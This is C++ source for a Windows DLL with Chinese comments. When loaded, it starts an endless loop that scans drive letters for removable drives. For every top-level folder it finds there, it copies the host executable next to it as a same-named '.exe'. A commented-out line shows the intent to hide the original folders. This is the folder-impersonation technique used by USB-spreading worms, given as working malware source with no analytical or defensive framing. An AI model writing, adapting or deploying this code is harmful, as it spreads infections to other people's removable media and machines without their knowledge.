// dllmain.cpp : 定义 DLL 应用程序的入口点。
#undef UNICODE
#include "stdafx.h"
#include <iostream>
#include <string>
#include <Windows.h>
#include <tchar.h>
using namespace std;
void getType(char * szPathClone);
void thisThread();
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		thisThread();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void thisThread()
{
	TCHAR szPathClone[_MAX_PATH];
	GetModuleFileName(NULL, szPathClone, _MAX_PATH);
	while (1)
	{
		getType(szPathClone);
	}
}
void getType(char * szPathClone)
{
	char findPath[_MAX_PATH] = "C:\\";
	char newFilePath[_MAX_PATH] = "C:\\";
	for (int i = 0; i < 10; i++)
	{
		findPath[0] = 'C' + i;
		newFilePath[0] = 'C' + i;
		if (int type = GetDriveTypeA(findPath) == DRIVE_REMOVABLE)
		{
			WIN32_FIND_DATA finddata = { 0 };
			strcat_s(findPath, "\\*.*");
			HANDLE hFindFile = FindFirstFileA(findPath, &finddata);
			do
			{
				char findPath[_MAX_PATH] = "C:\\";
				char newFilePath[_MAX_PATH] = "C:\\";
				findPath[0] = 'C' + i;
				newFilePath[0] = 'C' + i;
				strcat_s(findPath, "\\*.*");

				char str_system[] = "System Volume Information";

				if (finddata.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY&&strcmp(str_system, finddata.cFileName))
				{
					strcat_s(newFilePath, finddata.cFileName);
					//SetFileAttributesA(tmpPathName.c_str(), 6);//设置文件夹属性为系统文件并且隐藏，达到隐藏的目的。
					strcat_s(newFilePath, ".exe");
					//cout << newFilePath << endl;

					HANDLE newFile = CreateFile(newFilePath, GENERIC_ALL, FILE_SHARE_WRITE&FILE_SHARE_READ,
						NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
					CloseHandle(newFile);//新建文件
					CopyFile(__TEXT(szPathClone), __TEXT(newFilePath), FALSE);
				}
			} while (FindNextFileA(hFindFile, &finddata));

		}
	}
}
